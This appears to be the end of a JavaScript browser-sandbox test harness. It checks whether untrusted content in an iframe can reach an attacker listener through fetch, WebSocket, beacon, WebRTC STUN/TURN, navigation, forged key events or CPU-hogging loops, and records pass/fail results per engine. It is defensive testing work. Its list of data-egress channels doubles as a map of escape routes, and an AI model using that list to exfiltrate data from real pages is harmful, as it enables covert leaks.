    for (const variant of probe === "integrity" || probe === "rtc" || probe === "net"
      ? ["cross", "same"]
      : ["cross"]) {
      udp = 0;
      tcp = 0;
      const { context, page } = await newPage();
      const mode = probe === "static" ? "static" : "scripted";
      const tag = await openShell(page, probe, { variant, mode });
      await sleep(probe === "integrity" ? 3500 : probe === "rtc" ? 4000 : 2500);
      const r = await frameResult(page);
      const log = await page.evaluate(() => window.__log);
      const got = hitsFor(tag);
      const id = `${probe}.${variant}`;
      engine.measurements[id] = {
        result: r,
        hits: got,
        udp,
        tcp,
        errors: log.errors,
        faults: log.faults,
      };
      check(`${id}.no-listener-hits`, got.length === 0, { hits: got });
      if (probe === "net") {
        for (const k of [
          "fetch",
          "xhr",
          "ws",
          "es",
          "worker",
          "shared",
          "wt",
          "bc",
          "open",
          "conn",
          "beacon",
        ]) {
          check(`${id}.locked-${k}`, r?.[k] === "undefined" || String(r?.[k]).startsWith("threw"), {
            v: r?.[k],
          });
        }
        check(
          `${id}.eval-blocked`,
          String(r?.eval).startsWith("threw") && String(r?.fn).startsWith("threw"),
          {
            eval: r?.eval,
            fn: r?.fn,
          },
        );
      }
      if (probe === "nonce") check(`${id}.no-nonce`, r !== null && /^\|*$/.test(r.nonces), { r });
      if (probe === "integrity") {
        check(`${id}.ran`, r?.done === 1, { r });
        for (const k of [
          "create",
          "createNS",
          "frag",
          "link",
          "modlink",
          "inner",
          "outer",
          "adjacent",
          "parser",
          "implementation",
          "template",
          "write",
        ]) {
          check(
            `${id}.refused-${k}`,
            r?.[k] === "undefined" || String(r?.[k]).startsWith("threw"),
            { v: r?.[k] },
          );
        }
        check(`${id}.trusted-types-default-taken`, r?.ttdup !== "true", { v: r?.ttdup });
      }
      if (probe === "rtc") {
        check(`${id}.no-stun-or-turn`, udp === 0 && tcp === 0, { udp, tcp });
        check(
          `${id}.constructors-locked`,
          r?.RTCPeerConnection === "undefined" && r?.webkitRTCPeerConnection === "undefined",
          { r },
        );
        check(
          `${id}.not-restorable`,
          r?.restore === "undefined" || String(r?.restore).startsWith("threw"),
          { r: r?.restore },
        );
      }
      if (probe === "realm") {
        check(
          `${id}.no-iframe`,
          String(r?.iframe).startsWith("threw") && String(r?.iframeHtml).startsWith("threw"),
          { r },
        );
        check(
          `${id}.fetch-stays-locked`,
          r?.fetchWrite === "undefined" &&
            String(r?.fetchDefine).startsWith("threw") &&
            /\/undefined$/.test(r?.fetchDelete ?? ""),
          { r },
        );
        check(`${id}.navigator-locked`, r?.navProto === "undefined/undefined", { r: r?.navProto });
        check(`${id}.new-document-cannot-create-link`, String(r?.newDoc).startsWith("threw"), {
          r: r?.newDoc,
        });
      }
      if (probe === "inject") {
        check(`${id}.script-field-ran-html-script-did-not`, r?.ran === 1 && r?.inputs === 0, { r });
      }
      if (probe === "static") check(`${id}.no-author-code`, r === null, { r });
      if (probe === "tamper") {
        check(`${id}.edited-script-blocked`, r === null && log.errors.includes(1), {
          r,
          errors: log.errors,
        });
      }
      await context.close();
    }
  }
  // WebRTC control: can this engine's STUN/TURN egress be observed at all in this harness?
  if (ONLY.has("rtc")) {
    udp = 0;
    tcp = 0;
    const { context, page } = await newPage();
    await page.goto(`${APP}/control-rtc`);
    await sleep(3000);
    engine.measurements["rtc.control"] = { title: await page.title(), udp, tcp };
    engine.measurements["rtc.provable"] = udp + tcp > 0;
    await context.close();
  }

  // ------------------------------------------------------------------------------------------------- nav
  if (ONLY.has("nav")) {
    const nav = {};
    for (const technique of Object.keys(NAV)) {
      for (const variant of ["cross", "same"]) {
        const { context, page } = await newPage();
        const tag = await openShell(page, "nav", { variant, extra: technique });
        await sleep(1500);
        const got = hitsFor(tag);
        nav[`${technique}.${variant}`] = got.length;
        check(`nav.${technique}.${variant}.no-attacker-hit`, got.length === 0, { hits: got });
        await context.close();
      }
    }
    // To the content origin itself: allowed by frame-src (residual risk, measured).
    for (const variant of ["cross", "same"]) {
      const before = ownHits.length;
      const { context, page } = await newPage();
      await openShell(page, "nav", { variant, extra: "own-assign" });
      await sleep(1500);
      const own = ownHits.slice(before);
      nav[`own-origin.${variant}`] = own.map((h) => ({ kind: h.kind, cookie: h.cookie !== "" }));
      await context.close();
    }
    engine.measurements.nav = nav;
  }

  // ------------------------------------------------------------------------------------------------- proto
  if (ONLY.has("proto")) {
    const { context, page } = await newPage();
    await openShell(page, "proto");
    await sleep(1200);
    let log = await page.evaluate(() => window.__log);
    check("proto.real-ready-only", log.ready === 4 && log.faults.length === 0, {
      ready: log.ready,
      faults: log.faults,
    });
    check(
      "proto.no-forged-navigation",
      log.positions.every((p) => p[1] === 0 && p[2] === 0),
      { positions: log.positions },
    );
    check("proto.no-window-open", log.opens === 0, { opens: log.opens });
    check("proto.preload-unverified", !log.offline.includes("ready"), { offline: log.offline });
    check(
      "proto.no-frame-keys-reached-onKey",
      log.keys.filter((k) => k.startsWith("frame:")).length === 0,
      { keys: log.keys },
    );
    // A real click into the frame (user activation) while the content forges gated keys on window and
    // dispatches synthetic key events: nothing reaches the shell.
    await page.evaluate(() => window.__player.goto(1, 0));
    await sleep(300);
    const box = await page.locator("iframe").boundingBox();
    await page.mouse.click(box.x + 50, box.y + 50);
    await sleep(600);
    log = await page.evaluate(() => window.__log);
    check(
      "proto.gesture-forgery-ignored",
      log.opens === 0 &&
        log.positions.every((p) => p[3] === "present") &&
        log.keys.filter((k) => k.startsWith("frame:")).length === 0,
      {
        opens: log.opens,
        keys: log.keys,
      },
    );
    // Real gated keys pressed with the frame focused: dropped in script mode (they work from the page).
    for (const key of ["s", "o", "p", "r", "k", "Enter", "f", "?"]) await page.keyboard.press(key);
    await sleep(300);
    log = await page.evaluate(() => window.__log);
    check(
      "proto.gated-keys-from-frame-dropped",
      log.opens === 0 && log.positions.every((p) => p[3] === "present"),
      {
        opens: log.opens,
        last: log.positions.at(-1),
      },
    );
    // Key flood from the frame: at most 10 per second reach navigation.
    const start = await page.evaluate(() => window.__log.positions.length);
    const t0 = Date.now();
    for (let i = 0; i < 60; i++) await page.keyboard.press("ArrowRight", { delay: 0 });
    const elapsed = Date.now() - t0;
    await sleep(300);
    log = await page.evaluate(() => window.__log);
    const moves = log.positions.slice(start);
    let worst = 0;
    for (const m of moves)
      worst = Math.max(worst, moves.filter((x) => x[0] >= m[0] && x[0] < m[0] + 1000).length);
    engine.measurements.flood = {
      pressed: 60,
      elapsedMs: elapsed,
      moves: moves.length,
      worstPerSecond: worst,
    };
    check("proto.flood-rate-limited", worst <= 10, engine.measurements.flood);
    await context.close();
  }

  // ------------------------------------------------------------------------------------------------- abuse
  if (ONLY.has("abuse")) {
    for (const kind of Object.keys(ABUSE)) {
      const { context, page } = await newPage();
      await openShell(page, "abuse", { extra: kind, fallback: true });
      const p0 = await page.evaluate(() => {
        window.__log.gap = 0;
        return performance.now();
      });
      const t0 = Date.now();
      // Watch from Node: when does the plain notice appear, is the fallback up, how responsive is the page?
      let noticeAt = null;
      let fallbackAt = null;
      let sawNotice = false;
      const deadline = t0 + (kind === "busy" ? 16_000 : 14_000);
      while (Date.now() < deadline) {
        const state = await page
          .evaluate(() => ({
            notice: !!document.querySelector("[data-pptaken-notice]"),
            scripted: window.__player.scripted,
            faults: window.__log.faults.map((f) => f[1]),
            src: document.querySelector("iframe")?.src ?? "",
          }))
          .catch(() => null);
        if (state?.faults.includes("unresponsive") && noticeAt === null) noticeAt = Date.now() - t0;
        if (state?.notice) sawNotice = true;
        if (sawNotice && state && !state.notice && fallbackAt === null)
          fallbackAt = Date.now() - t0;
        await sleep(250);
      }
      const log = await page.evaluate(() => window.__log);
      const shown = log.notice.find((n) => n[1]);
      const hidden = log.notice.find((n) => !n[1] && shown && n[0] >= shown[0]);
      if (shown && noticeAt === null) noticeAt = Math.round(shown[0] - p0);
      fallbackAt = hidden ? Math.round(hidden[0] - p0) : null;
      // Responsive afterwards: a key on the page is handled within 2 s.
      const k0 = Date.now();
      await page.evaluate(() => document.body.focus());
      await page.keyboard.press("b");
      const responsiveMs = Date.now() - k0;
      const m = {
        gapMs: Math.round(log.gap),
        watchdogAtMs: noticeAt,
        fallbackAtMs: fallbackAt,
        responsiveMs,
        faults: log.faults.map((f) => f[1]),
      };
      engine.measurements[`abuse.${kind}`] = m;
      const isolated = m.gapMs < 1000;
      if (kind === "busy") {
        // Isolated engines: the parent stays responsive and the watchdog fires while the loop runs.
        // Others: the documented freeze (the parent blocks for the loop); the page recovers afterwards.
        check(
          `abuse.busy.${isolated ? "contained" : "documented-freeze"}`,
          isolated
            ? noticeAt !== null && noticeAt < 8000 && fallbackAt !== null
            : m.gapMs >= 5000 && responsiveMs < 2000,
          m,
        );
      } else {
        check(`abuse.${kind}.page-recovers`, responsiveMs < 3000, m);
      }
      if (noticeAt !== null) check(`abuse.${kind}.fallback-after-watchdog`, fallbackAt !== null, m);
      await context.close();
    }
  }

  await browser.close();
  writeFileSync(OUT, `${JSON.stringify(report, null, 2)}\n`);
}

listener.close();
appServer.close();
contentServer.close();
turn.close();
stun.close();
writeFileSync(OUT, `${JSON.stringify(report, null, 2)}\n`);
const summary = Object.entries(report.engines).map(([n, e]) =>
  e.skipped
    ? `${n}: skipped`
    : `${n}: ${e.checks.filter((c) => c.ok).length}/${e.checks.length} passed`,
);
console.log(summary.join("\n"));
process.exit(failures > 0 ? 1 : 0);
